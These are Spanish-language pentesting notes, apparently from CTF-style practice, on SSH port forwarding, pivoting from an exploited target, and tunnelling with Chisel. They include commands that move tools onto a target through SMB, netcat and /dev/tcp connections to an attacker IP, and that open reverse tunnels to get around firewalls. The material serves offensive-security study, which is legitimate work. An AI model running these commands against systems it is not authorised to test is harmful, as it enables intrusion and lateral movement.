** Port Forwarding  (Redirección de puertos, tunelización de puertos) **
Acción de redirigir un puerto de red de un nodo de red a otro. Permite a un usuario externo tener acceso a un puerto de una dirección IP privada (dentro de una LAN) desde el exterior vía un router con NAT activado. Se hace a través de SSH para evadir restricciones de firewall y filtros establecidos en la red. Tipos de Port Forwarding:
- Local Port Forwarding --> conexión máquina local a una máquina remota en un puerto determinado.
		`ssh -L 8080:www.debian.org:80 root@192.168.1.34`
		// Se abre un túnel en el puerto 8080 entre la máquina local y la 192.168.1.34. Cuando en ésta última máquina se accede al puerto 8080 se accederá desde la máquina local al recuros ww.debian.org y lo filtrará por el puerto 80.
- Remote Port Forwarding --> Se abre un puerto en la máquina servidora (servicio ssh) y posteriormente este apunta a una dirección concreta (en el sentido contrario). Realizado para bypassear restricciones de proxies y firewalls.
		`ssh -R 8080:192.168.1.33:22 root@192.168.1.34`
		// Máquina atacante (33) establece Remote Port Forwarding con máquina objetivo (34).
- Dynamic Forwarding --> Convierte el servidor SSH en un servidor proxy socks. El puerto establecerá una conexión segura, similar a Remote Forwarding pero no redirecciona a una dirección fija, sino a una dirección dinámica que solicita el cliente.
		`ssh -D 8090 -C root@192.168.1.34`
		// Puerto dinámico en 8090
		
==================================================================

** Port Triggering **
Impulso de disparo de señales del puerto.
Mapeador de puertos dinámico. Se asocia un "trigger-port" a un conjunto de purtos a abrir, de forma que cuando la máquina local se conecte a ese "trigger-port" el router abrirá los puertos que se le han asociado cuando reciba una petición entrante en esa conexión.

==================================================================

** Reenvío  remoto de puertos **
Cuando nos encontramos en una máquina que hemos explotado un puerto abierto pero sólo podemos acceder a él de forma local, es posible redirigir los paquetes de un puerto a uno en nuestra máquina local.
>Comprobamos los puertos abiertos en la máquina
>`netstat -nat | grep "8080"`
>En la máquina objetivo se puede realizar un remote port forwarding con la herramienta ssh
>`ssh -R 4646:127.0.0.1:8080 s4vitar@<own_ip> -fNT`
>fNT permite crear la regla pero sin entrar en nuestro sistema
>En nuestra máquina local comprobamos el puerto 4646 si está abierto 
>`netstat -nat | grep "4646"`
>Podemos acceder desde nuestro navegador desde localhost:4646

==================================================================

** Local Port Forwarding **
> Desde la máquina local (atacante), nos conectamos a la máquina objetivo mediante SSH y redireccionamos un puerto interno en la máquina objetivo para que sea visible en nuestra máquina local (atacante)
> `ssh development@10.10.10.228 -L 1234:127.0.0.1:1234`
> Si este fuera un puerto con un servicio HTTP, podríamos acceder a él desde nuestra máquina local. desde el navegador: `http://localhost:1234`

==================================================================

** Remote Port Forwarding con Chisel ** 
> Descargar releases para Linux y WIndows (amd64): https://github.com/jpillora/chisel/releases

Compilar Chisel
> `go build -ldflags "-s -w" .`
> `upx brute chisel`

Transferir "chisel_windows_amd64" a la máquina objetivo ya descomprimido:
> Descomprimir fichero para Windows (64 bits) 
> `gunzip chisel_windows_amd64.exe.gz`
> Montar servidor SMB en local para compartir el binario "chishel_windows_amd64.exe"
> `impacket-smbserver smbFolder $(pwd) -smb2support -username s4vitar -password s4vitar`
> Desde la máquina objetivo, transferir el binario
> `copy \\10.10.14.6\smbFolder\chisel_windows_amd64.exe C:\Windows\Temp`

Si estamos en Linux, también podemos usar "netcat" para transferir un fichero, en este caso el binario de nmap para Linux.
> En local, compartimos el binario por netcat
> `nc -nlvp 443 < chisel`
> En la máquina objetivo
> `nc 10.9.6.44 443 > chisel`
> En la máquina objetivo, si no existen netcat, podemos utilizar '/dev/tcp'
> `cat > nmap < /dev/tcp/10.9.6.44/443`

Crear Port Forwarding.
> Montar servidor Chisel en máquina atacante:
> `./chisel server -p 8008 --reverse`
> Montar cliente Chisel en máquina objetivo:
> `C:\Windows\Temp\chisel_windows_amd64.exe client 10.10.14.6:8008 R:88:127.0.0.1:88 R:389:localhost:389`
> Comprobar Port Forwarding en máquina atacante:
> `netsat -nat | grep "88"` || `lsof -i:88`
